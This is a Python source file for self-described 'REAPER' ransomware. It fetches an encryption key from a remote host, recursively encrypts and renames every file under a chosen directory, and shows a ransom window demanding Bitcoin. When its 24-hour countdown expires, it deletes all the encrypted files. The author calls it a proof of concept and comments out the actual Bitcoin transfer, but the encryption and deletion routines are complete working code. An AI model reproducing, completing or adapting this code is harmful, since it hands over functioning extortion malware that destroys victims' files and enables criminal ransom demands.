# The reaper ransomware 8========D
import os,sys,json,time,socket
from cryptography.fernet import Fernet
from tkinter import *
from bitcoinlib.wallets import Wallet

# Variables to be changed 
DIR = "C:/Users/krist/Documents/todo_list"
TARGET_WALLET = "your wallet here"
AMOUNT_OF_BITCOIN = 0.061

# Variables
dirs = []
JSON_FILE = "ext.json"
COLORS = {
  "hacker_green": "\033[1;32;40m",
  "red": "\033[1;31;40m",
  "white":"\033[1;37;40m",
}
HOST = sys.argv[2]
banner = f"""
{COLORS["hacker_green"]}
 /$$$$$$$                                                   
| $$__  $$                                                  
| $$  \ $$  /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$   /$$$$$$ 
| $$$$$$$/ /$$__  $$ |____  $$ /$$__  $$ /$$__  $$ /$$__  $$
| $$__  $$| $$$$$$$$  /$$$$$$$| $$  \ $$| $$$$$$$$| $$  \__/
| $$  \ $$| $$_____/ /$$__  $$| $$  | $$| $$_____/| $$      
| $$  | $$|  $$$$$$$|  $$$$$$$| $$$$$$$/|  $$$$$$$| $$      
|__/  |__/ \_______/ \_______/| $$____/  \_______/|__/      
                              | $$                          
                              | $$                          
                              |__/                          
{COLORS["white"]}"""
RANSOM_TEXT = f""" 
This is the REAPER ransomware.

DO NOT CLOSE THIS WINDOW!
Once the window is closed, the program stopped or 
the computer powered off you will not be able to send 
the Bitcoin which will result in you not getting the 
encryption key and the files back.

Also do not delete 'ext.json' that contains data about
your files.

Pay for the ransom to be removed {AMOUNT_OF_BITCOIN} Bitcoin.
The payment must be in Bitcoin.
Once you paid, all files will be back to normal.
If instructions are not followed all files will be deleted

Click on 'Go ahead' and follow the instructions.
"""
PAYMENT_INSTRUCTIONS =  """ 
Instructions:
 - Create new wallet
 - Send money to the new wallet
 - Press 'Pay' to send money and get the encryption key
"""

# Method for getting the key from the server
def get_key():
  global KEY
  s = socket.socket()
  s.connect((HOST,80))
  KEY = s.recvfrom(1024)
  KEY = KEY[0]
  s.close()
  return KEY

# Method for creating tkinter labels
def create_tkinter_label(name,root,text,color,font_size):
  name = Label(root,text=text, bg="black", fg=color, font=("Courier", font_size))
  name.pack()

# Method for creating tkinter buttons
def create_tkinter_button(name,root,text,color,font_size,command):
  name = Button(root, text=text, bg="#606060", fg=color,font=("Courier", font_size), command=command)
  name.pack()

# Method for creating tkinter entries
def create_tkinter_entry(name,root,color,font_size):
  name = Entry(root, bg="#606060", fg=color, font=("Courier", font_size))
  name.pack()

# Method to decrypt the ext.json file
def decrypt_json(fernet):
  json_file = open(JSON_FILE, "rb")
  json_content = json_file.read()
  json_file.close()
  file = open(JSON_FILE, 'wb')
  file.write(fernet.decrypt(json_content))
  file.close()

# The file rewriting class
class TakeOver():
  def __init__(self):
    get_key()
    print(banner)
    # Encrypt file
    self.fernet = Fernet(KEY) 
    self.file_data = {}
    #The DIR to start with
    self.destruct(DIR)

  # Taking over the files
  def destruct(self,directory):
    for i in os.listdir(directory):
      PATH = f"{directory}/{i}"
      #Check for dir
      if os.path.isdir(PATH):
        self.destruct(PATH)
        continue
      # Get file content
      o_f = open(PATH,"rb")
      content = o_f.read()
      o_f.close()
      # Change file ext
      ext = '.' + os.path.realpath(PATH).split('.')[-1:][0]
      if ext == ".rpr":
        print(f"{COLORS['red']}{i} is already encrypted{COLORS['white']}")
      print(f"Attacking: {PATH}")
      self.rpr_file = i.replace(ext, '.rpr')
      ENC_FILE = f"{directory}/{self.rpr_file}"
      try:
        os.rename(PATH, ENC_FILE)
      except FileExistsError:
        pass
      try:
        # Encrypt content of the file
        file = open(ENC_FILE, 'wb')
        file.write(self.fernet.encrypt(content))
        file.close()
      except PermissionError:
        pass
      # Noting the encrypted files in a json format
      self.file_data[str(ENC_FILE)] = ext
      with open('ext.json', 'w') as a:
        json.dump(self.file_data, a)
    # Encrypting JSON file
    json_file = open(JSON_FILE, "rb")
    json_file_content = json_file.read()
    json_file.close()
    file = open(JSON_FILE, 'wb')
    file.write(self.fernet.encrypt(json_file_content))
    file.close()
      
# Decrypt files
class TakeBack():
  def __init__(self):
    print(banner)
    # Get encryption key
    self.fernet = Fernet(KEY)
    # Decrypt json file
    decrypt_json(self.fernet)
    with open(JSON_FILE) as files:
      self.ENC_FILES = json.load(files)
    for i in self.ENC_FILES:
      # Put old extension back to the file
      ext = '.' + os.path.realpath(i).split('.')[-1:][0]
      if ext != ".rpr":
        print(f"{COLORS['red']}{i} is not encrypted{COLORS['white']}")
        continue
      self.o_file = i.replace(ext, f'{self.ENC_FILES[i]}')
      print(f"Restoring: {i}")
      # Get file content
      o_f = open(i, "rb")
      content = o_f.read()
      o_f.close()
      try:
        # Decrypt the content of the file
        file = open(self.o_file, 'wb')
        file.write(self.fernet.decrypt(content))
        file.close()
        #remove encrypted files
        os.remove(i)
      except PermissionError:
        pass
    print("Files are back to normal, REAPER is quitting...")
    os.remove(JSON_FILE)

# Class for the countdown timer window
class TimerWindow():
  def __init__(self): 
    # Max time to pay ransom
    self.secs = 86400
    # Window
    self.root = Tk()
    self.root.resizable(False,False)
    self.root.geometry("800x800")
    self.root.title("REAPER - COUNTDOWN")
    self.root.configure(bg="black")
    # Reaper text
    create_tkinter_label("rpr_label",self.root,"\nREAPER","#00FF00",60)
    # Countdown timer
    self.c_time = StringVar()
    self.c_time.set(self.secs)
    self.timer = Label(self.root, textvariable=self.c_time,bg="black", fg="#00FF00", font=("Courier", 25))
    self.timer.pack()
    # Explanation
    create_tkinter_label("exp",self.root,RANSOM_TEXT,"#00FF00",12)
    # Bitcoin button
    create_tkinter_button("pay_btc_btn", self.root, "Go ahead","#00FF00",20,Payment)

  # Method to decrease timer
  def decrease_time(self):
    if self.secs == 0:
      self.delete_all_files()
    else:
      self.secs -= 1
      self.time_left = f"Time left:\n{self.secs//3600}:{self.secs%3600//60}:{self.secs%3600%60}\n"
      self.c_time.set(self.time_left)
      self.root.after(1000, self.decrease_time)

  # Method to delete all files
  def delete_all_files(self):
    self.fernet = Fernet(KEY)
    # Decrypt json file
    decrypt_json(self.fernet)
    # Remove files
    print(f"{COLORS['red']}No ransom was paid, deleting files...{COLORS['white']}")
    with open(JSON_FILE) as files:
      self.files = json.load(files)
    for i in self.files:
      try:
        os.remove(i)
      except PermissionError:
        pass
      print(f"Deleting: {i}")
    os.remove(JSON_FILE)
    sys.exit()

class Payment():
  # Window
  def __init__(self):
    self.root = Tk()
    self.root.resizable(False, False)
    self.root.geometry("800x800")
    self.root.title("REAPER - PAYMENT & ACCOUNT")
    self.root.configure(bg="black")
    # Reaper text
    create_tkinter_label("rpr_label", self.root, "\nREAPER", "#00FF00", 60)
    # Disclaimer
    create_tkinter_label("f", self.root,"Follow the instructions to get the encryption key\n", "#00FF00", 15)
    # Instructions
    create_tkinter_label("inst",self.root, PAYMENT_INSTRUCTIONS,"#00FF00",15)
    # Wallets
    create_tkinter_label("wallet_name_lbl", self.root,"Your wallet's name", "#00FF00",15)
    self.wallet_name = Entry(self.root,fg="#00FF00", bg="black", font=("Courier",20))
    self.wallet_name.pack()
    # Payment button
    self.acc = Button(self.root, text="Make new account", fg="#00FF00",bg="#404040", font=("Courier", 20), command=self.new_wallet)
    self.acc.pack()
    self.root.mainloop()
    
  # Wallet creation
  def new_wallet(self):
    self.wallet = Wallet.create(self.wallet_name.get())
    self.wallet_key = self.wallet.get_key()
    self.acc.destroy()
    create_tkinter_label("wallet_addr", self.root,f"Your address:\n{self.wallet_key.address}", "#00FF00", 11)
    create_tkinter_button("pay", self.root, "Pay","#00FF00", 20, self.send_bitcoin)

  # Transaction
  def send_bitcoin(self):
    """
    # Uncomment these if you want the transaction to take place.
    Also it might not work since I do not have Bitcoin to try it.
    It's a proof of concept anyways.

    self.wallet.scan()
    self.transaction = self.wallet.send_to(TARGET_WALLET, AMOUNT_OF_BITCOIN)
    print(self.transaction.info())
    """
    self.decrypt()

  def decrypt(self):
    TakeBack()
    sys.exit()
    
# Calling classes
if sys.argv[1] == "-t":
  r = TakeOver()
  t = TimerWindow()
  t.decrease_time()
  t.root.mainloop()
else:
  print("Wrong parameters...")
  sys.exit()
